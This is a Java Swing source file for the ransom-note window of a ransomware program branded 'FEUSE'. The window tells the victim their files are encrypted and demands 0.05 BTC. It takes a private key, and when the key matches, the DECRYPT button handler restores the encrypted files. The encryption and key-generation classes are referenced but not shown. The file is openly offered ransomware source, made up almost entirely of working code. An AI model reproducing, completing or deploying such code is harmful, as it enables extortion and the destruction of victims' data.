package encryptor;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JLabel;
import java.awt.Font;
import java.awt.Color;
import javax.swing.SwingConstants;
import java.awt.CardLayout;
import java.awt.GridBagLayout;
import java.awt.GridBagConstraints;
import java.awt.FlowLayout;

import javax.crypto.NoSuchPaddingException;
import javax.swing.BoxLayout;
import javax.swing.SpringLayout;
import javax.swing.JTextPane;
import javax.swing.JTextField;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.util.Base64;
import java.awt.event.ActionEvent;

public class EncFile extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JPanel contentPane;
	private JTextField PKInput;
	private AsymmetricCryptography ac;
	private static boolean dec = false;
	private TempFile tf = new TempFile();

	/**
	 * Create the frame.
	 */
	public EncFile() {
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 663, 468);
		contentPane = new JPanel();
		contentPane.setBackground(new Color(204, 0, 51));
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		SpringLayout sl_contentPane = new SpringLayout();
		contentPane.setLayout(sl_contentPane);

		JTextPane txtpnOoopsYourFiles = new JTextPane();
		txtpnOoopsYourFiles.setEditable(false);
		sl_contentPane.putConstraint(SpringLayout.NORTH, txtpnOoopsYourFiles, 10, SpringLayout.NORTH, contentPane);
		sl_contentPane.putConstraint(SpringLayout.WEST, txtpnOoopsYourFiles, 150, SpringLayout.WEST, contentPane);
		sl_contentPane.putConstraint(SpringLayout.SOUTH, txtpnOoopsYourFiles, -253, SpringLayout.SOUTH, contentPane);
		sl_contentPane.putConstraint(SpringLayout.EAST, txtpnOoopsYourFiles, -124, SpringLayout.EAST, contentPane);
		txtpnOoopsYourFiles.setText(
				"OOOPS, YOUR FILES ARE ENCRYPTED BY FEUSE. \r\nIF YOU WISH TO DECRYPT THEM PLEASE SEND 0.05 BTC");
		contentPane.add(txtpnOoopsYourFiles);

		JLabel lblPrivateKey = new JLabel("Private Key");
		lblPrivateKey.setFont(new Font("Tahoma", Font.BOLD, 12));
		sl_contentPane.putConstraint(SpringLayout.WEST, lblPrivateKey, 55, SpringLayout.WEST, contentPane);
		sl_contentPane.putConstraint(SpringLayout.SOUTH, lblPrivateKey, -65, SpringLayout.SOUTH, contentPane);
		contentPane.add(lblPrivateKey);

		PKInput = new JTextField();
		sl_contentPane.putConstraint(SpringLayout.WEST, PKInput, 11, SpringLayout.EAST, lblPrivateKey);
		sl_contentPane.putConstraint(SpringLayout.SOUTH, PKInput, -60, SpringLayout.SOUTH, contentPane);
		sl_contentPane.putConstraint(SpringLayout.EAST, PKInput, 392, SpringLayout.EAST, lblPrivateKey);
		contentPane.add(PKInput);
		PKInput.setColumns(10);

		JButton SendPK = new JButton("DECRYPT");
		SendPK.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					AsymmetricCryptography ac = AsymmetricCryptography.getAsymmetricCryptography();
					GenerateKeys gk = GenerateKeys.getGenerateKeys();
					PrivateKey privateKey1 = gk.getPrivateKey();		
					Base64.Encoder encoder = Base64.getEncoder();
					String prvkenc = encoder.encodeToString(privateKey1.getEncoded());				
					TempFile tf = new TempFile();
					FoundTempFile ftf = new FoundTempFile();
					Decryptor dec = Decryptor.getDecrypter(true);			
					File newFile = new File(ftf.getFileSrc());
			
					if (PKInput.getText().contentEquals(prvkenc)) {
				
						txtpnOoopsYourFiles.setText("Your files have been decrypted, thank you.");
						dec.decrypt(newFile, newFile);
						ac.dec(tf.getFile(), tf.getFileSrc(), privateKey1);
						
					} else {
						txtpnOoopsYourFiles.setText("Wrong Key");
					}

				} catch (Exception e1) {
				
					e1.printStackTrace();
				}
			}
		});
		sl_contentPane.putConstraint(SpringLayout.NORTH, SendPK, 0, SpringLayout.NORTH, lblPrivateKey);
		sl_contentPane.putConstraint(SpringLayout.WEST, SendPK, 13, SpringLayout.EAST, PKInput);
		contentPane.add(SendPK);

		JLabel lblFeuse = new JLabel("FEUSE");
		sl_contentPane.putConstraint(SpringLayout.NORTH, lblFeuse, 40, SpringLayout.NORTH, contentPane);
		sl_contentPane.putConstraint(SpringLayout.WEST, lblFeuse, 34, SpringLayout.WEST, contentPane);
		lblFeuse.setFont(new Font("Tahoma", Font.BOLD, 23));
		lblFeuse.setEnabled(false);
		contentPane.add(lblFeuse);

		JLabel label = new JLabel("FEUSE");
		sl_contentPane.putConstraint(SpringLayout.NORTH, label, 43, SpringLayout.SOUTH, txtpnOoopsYourFiles);
		sl_contentPane.putConstraint(SpringLayout.EAST, label, -280, SpringLayout.EAST, contentPane);
		label.setFont(new Font("Tahoma", Font.BOLD, 23));
		label.setEnabled(false);
		contentPane.add(label);

		JLabel label_1 = new JLabel("FEUSE");
		sl_contentPane.putConstraint(SpringLayout.NORTH, label_1, 0, SpringLayout.NORTH, lblFeuse);
		sl_contentPane.putConstraint(SpringLayout.EAST, label_1, -25, SpringLayout.EAST, contentPane);
		label_1.setFont(new Font("Tahoma", Font.BOLD, 23));
		label_1.setEnabled(false);
		contentPane.add(label_1);

		JLabel label_2 = new JLabel("FEUSE");
		sl_contentPane.putConstraint(SpringLayout.NORTH, label_2, 109, SpringLayout.SOUTH, lblFeuse);
		sl_contentPane.putConstraint(SpringLayout.WEST, label_2, 64, SpringLayout.WEST, contentPane);
		label_2.setFont(new Font("Tahoma", Font.BOLD, 23));
		label_2.setEnabled(false);
		contentPane.add(label_2);

		JLabel label_3 = new JLabel("FEUSE");
		sl_contentPane.putConstraint(SpringLayout.NORTH, label_3, 0, SpringLayout.NORTH, label_2);
		sl_contentPane.putConstraint(SpringLayout.EAST, label_3, 0, SpringLayout.EAST, label_1);
		label_3.setFont(new Font("Tahoma", Font.BOLD, 23));
		label_3.setEnabled(false);
		contentPane.add(label_3);
	}
}
